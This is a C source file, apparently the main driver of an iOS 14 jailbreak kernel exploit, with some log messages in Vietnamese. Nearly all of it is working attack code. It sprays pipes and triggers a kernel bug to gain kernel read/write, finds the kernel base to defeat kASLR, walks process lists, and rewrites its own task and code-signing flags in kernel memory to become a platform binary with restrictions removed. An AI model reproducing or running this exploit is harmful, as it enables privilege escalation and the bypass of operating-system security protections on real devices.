//
//  exploit_main.c
//  pre-jailbreak
//
//  Created by Quote on 2021/2/19.
//

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdbool.h>
#include <sys/time.h>
#include <mach/mach.h>
#include <setjmp.h>

#include "mycommon.h"
#include "k_offsets.h"
#include "utils.h"
#include "k_utils.h"
#include "../utils/krw/KernelRwWrapper.h"
#include "user_kernel_alloc.h"
#include "cicuta_virosa/cicuta_virosa.h"
#include "krw.h"

extern mach_port_t IOSurfaceRootUserClient;
uint32_t iosurface_create_fast(void);
uint32_t iosurface_s_get_ycbcrmatrix(void);
void iosurface_s_set_indexed_timestamp(uint64_t v);

static int *pipefds;
static size_t pipe_buffer_size = 0x1000;
static uint8_t *pipe_buffer;
static kptr_t IOSurfaceRoot_uc;
uint64_t kernel_proc = 0;
uint64_t all_proc = 0;
uint64_t our_proc = 0;
uint64_t our_task_addr = 0;
uint64_t launchd_proc = 0;

uint32_t TF_PLATFORM = 0x00000400;

uint32_t CS_VALID = 0x00000001;
uint32_t CS_GET_TASK_ALLOW = 0x00000004;
uint32_t CS_INSTALLER = 0x00000008;

uint32_t CS_HARD = 0x00000100;
uint32_t CS_KILL = 0x00000200;
uint32_t CS_RESTRICT = 0x00000800;

uint32_t CS_PLATFORM_BINARY = 0x04000000;
uint32_t CS_DEBUGGED = 0x10000000;
uint32_t P_SUGID = 0x00000100;


static void read_pipe(void)
{
    size_t read_size = pipe_buffer_size - 1;
    ssize_t count = read(pipefds[0], pipe_buffer, read_size);
    if (count == read_size) {
        return;
    } else if (count == -1) {
        perror("read_pipe");
        util_error("could not read pipe buffer");
    } else if (count == 0) {
        util_error("pipe is empty");
    } else {
        util_error("partial read %zu of %zu bytes", count, read_size);
    }
    fail_info(__FUNCTION__);
}

static void write_pipe(void)
{
    size_t write_size = pipe_buffer_size - 1;
    ssize_t count = write(pipefds[1], pipe_buffer, write_size);
    if (count == write_size) {
        return;
    } else if (count < 0) {
        util_error("could not write pipe buffer");
    } else if (count == 0) {
        util_error("pipe is full");
    } else {
        util_error("partial write %zu of %zu bytes", count, write_size);
    }
    fail_info(__FUNCTION__);
}

uint64_t find_all_proc(void){
    uint64_t proc = rk64(g_exp.kernel_proc + 8);
    while (proc != 0) {
        uint64_t prevProc = rk64(proc + 8);
       // badLog("prevproc: 0x%llX", prevProc);
        uint32_t pid = rk32(proc + 0x68);
       // badLog("pid: %llX", pid);
        if(pid == 0){
            util_printf("Có thể đã tìm thấy allproc...\n");
            all_proc = proc;
            util_info("allproc: 0x%llX", all_proc);
            break;
        }
        if (prevProc == 0) {
            fail_info("Không thể tìm thấy allProc\n");
            all_proc = 0;
            break;
        } if (rk64(prevProc) != proc){
            util_info("Allproc 0x%llX", proc);
            all_proc = proc;
            break;
        }
        proc = prevProc;
    }
    
    
    return 0;
}
uint64_t fin_kern_proc(void){
    uint64_t proc = g_exp.self_proc;
    uint32_t pid = 0;
    while (proc != 0) {
        pid = rk32(proc + 0x68);
      //  badLog("pid: 0x%llX", pid);
        if (pid == 0){
            util_printf("Thành lập kernproc\n");
            kernel_proc = proc;
            util_info("kern_proc: 0x%llX", kernel_proc);
            break;
        }
        proc = rk64(proc);
       // badLog("proc: 0x%llX", proc);
    }
    return 0;
}


void fixOurProc(uint64_t our_proc){
    our_task_addr = rk64ptr(our_proc + OFFSET(proc, task));
    
    uint32_t our_flags = rk32(our_task_addr + OFFSET(task, t_flags));
    wk32(our_task_addr + OFFSET(task, t_flags), our_flags | TF_PLATFORM);
    
    uint32_t our_csflags = rk32(our_proc + 0x280);
    our_csflags = our_csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW;
    our_csflags &= ~(CS_RESTRICT | CS_HARD | CS_KILL);
    wk32(our_proc + 0x280, our_csflags);
}


void pop_procs(void){
    uint32_t our_pid = getpid();
    uint64_t proc = all_proc != 0 ? rk64(all_proc) : kernel_proc;
    while (proc != 0) {
        uint32_t pid = rk32(proc + 0x68);
        if (pid == 0 && all_proc != 0) {
            kernel_proc = proc;
            util_printf("Thành lập kernel proc\n");
        }else if (pid == our_pid) {
            util_printf("Thành lập our pid\n");
            
            our_proc = proc;
            fixOurProc(proc);
            
            uint64_t our_vnode = rk64ptr(proc + 0x220);
            if (our_vnode != 0) {
                uint64_t ubc_info = rk64ptr(our_vnode + 0x78);
                if (ubc_info != 0) {
                    uint64_t cs_blobs = rk64ptr(ubc_info + 0x50);
                    while (cs_blobs != 0) {
                        uint32_t csb_platform_binary = rk32(cs_blobs + 0xA0);
                        wk32(cs_blobs + 0xA0, csb_platform_binary | 1);
                        
                        cs_blobs = rk64ptr(cs_blobs);
                    }
                }
            }
        }
        else if (pid == 1) {
            util_printf("Thành lập launchd\n");
            
            launchd_proc = proc;
        }
        
    }
}

void exploit_main(void)
{
    sys_init();
    kernel_offsets_init();
    bool ok = IOSurface_init();
    fail_if(!ok, "can not init IOSurface lib");
    uint32_t surf_id = iosurface_create_fast();
    util_info("surface_id: %u", surf_id);
    size_t pipe_count = 1;
    pipefds = create_pipes(&pipe_count);
    pipe_buffer = (uint8_t *)malloc(pipe_buffer_size);
    memset_pattern4(pipe_buffer, "pipe", pipe_buffer_size);
    pipe_spray(pipefds, 1, pipe_buffer, pipe_buffer_size, NULL);
    read_pipe();

    struct timeval tv1, tv2;
    gettimeofday(&tv1, NULL);
    // open the door to iOS 14
    
   // if do_kopen(0x800, 0x0, 0x2, 0x2) != 0 {
    do_kopen(0x800, 0x0, 0x2, 0x2);
   // cicuta_virosa();
    gettimeofday(&tv2, NULL);
    uint64_t cost = (tv2.tv_sec - tv1.tv_sec) * 1000 * 1000 + tv2.tv_usec - tv1.tv_usec;
    util_info("cost: %.3f seconds", cost / 1000000.0);
   
    //defer { terminateKernRw() };
    util_info("self_task: 0x%llX", g_exp.self_task);
    g_exp.self_ipc_space = rk64ptr(g_exp.self_task + OFFSET(task, itk_space));
    util_info("self_ipc_space: 0x%llX", g_exp.self_ipc_space);
    g_exp.self_proc = our_proc_kAddr;

    IOSurfaceRoot_uc = port_name_to_kobject(IOSurfaceRootUserClient);
    util_info("IOSurfaceRoot_uc: 0x%llX", IOSurfaceRoot_uc);
    kptr_t surfaceClients = rk64ptr(IOSurfaceRoot_uc + OFFSET(IOSurfaceRootUserClient, surfaceClients));
    util_info("surfaceClients: 0x%llX", surfaceClients);
    kptr_t IOSurfaceClient_obj = rk64ptr(surfaceClients + sizeof(kptr_t) * surf_id);
    util_info("IOSurfaceClient_obj: 0x%llX", IOSurfaceClient_obj);

    util_info("build stable kernel r/w primitives");
    util_info("---- done ----");

    kptr_t vt_ptr = rk64(IOSurfaceClient_obj);
    if ((vt_ptr >> 39) != 0x1ffffff) {
        g_exp.has_PAC = true;
    }
    util_info("vt_ptr: 0x%llX", vt_ptr);

    util_info("defeat kASLR");

    kptr_t IOSurfaceClient_vt;
    kptr_t IOSurfaceClient_vt_2; // OSObject::release
    IOSurfaceClient_vt = rk64ptr(IOSurfaceClient_obj);
    IOSurfaceClient_vt_2 = rk64ptr(IOSurfaceClient_vt + 2 * sizeof(kptr_t));

    util_info("vt: 0x%llX, vt[2]: 0x%llX", IOSurfaceClient_vt, IOSurfaceClient_vt_2);
    util_msleep(100);

    const uint32_t mach_header[4] = { 0xfeedfacf, 0x0100000c, 0, 2 };
    uint32_t data[4];
    kptr_t kernel_base = IOSurfaceClient_vt_2; // located in __TEXT_EXEC
    kernel_base &= ~(g_exp.pagesize - 1);
    while (1) {
        kread(kernel_base, data, sizeof(mach_header));
        data[2] = mach_header[2]; // ignore CPU subtype
        if (!memcmp(mach_header, data, sizeof(mach_header))) {
            break; // found
        }
        kernel_base -= g_exp.pagesize;
    }
    g_exp.kernel_base = kernel_base;
    g_exp.kernel_slide = kernel_base - kc_kernel_base;
    // assume that kc_kernel_base always equals to 0xFFFFFFF007004000
    util_info("kernel base: 0x%llX", g_exp.kernel_base);
    util_info("kernel slide: 0x%llX",g_exp.kernel_slide);
    
    
    g_exp.kernel_proc = kproc_find_pid0(g_exp.self_proc);
    uint64_t kernel_proc2 = kproc_find_pid0(g_exp.self_proc);
    g_exp.kernel_task = rk64ptr(kernel_proc2 + OFFSET(proc, task));
    util_info("kernel_proc: 0x%llX", g_exp.kernel_proc);
    util_info("kernel_task: 0x%llX", g_exp.kernel_task);
    g_exp.kernel_map = rk64ptr(g_exp.kernel_task + OFFSET(task, map));
    util_info("kernel_map: 0x%llX", g_exp.kernel_map);

    // device&OS dependent
    // end

    g_exp.self_proc = kproc_find_by_pid(getpid());
    util_info("self_proc: 0x%llX", g_exp.self_proc);
    util_msleep(100);

    g_exp.self_task = rk64ptr(g_exp.self_proc + OFFSET(proc, task));
    g_exp.self_ipc_space = rk64ptr(g_exp.self_task + OFFSET(task, itk_space));
    util_info("self_task: 0x%llX", g_exp.self_ipc_space);
    util_info("self_ipc_space: 0x%llX", g_exp.self_ipc_space);
    find_all_proc();
    ksetOffsets(g_exp.kernel_slide + 0xFFFFFFF007004000, g_exp.kernel_proc, all_proc);
    if (g_exp.debug) {
        util_info("---- dump kernel cred ----");
        debug_dump_proc_cred(g_exp.kernel_proc);
        util_info("---- dump self cred ----");
        debug_dump_proc_cred(g_exp.self_proc);
    }

    post_exploit();

    // clean KHEAP by yourself
}
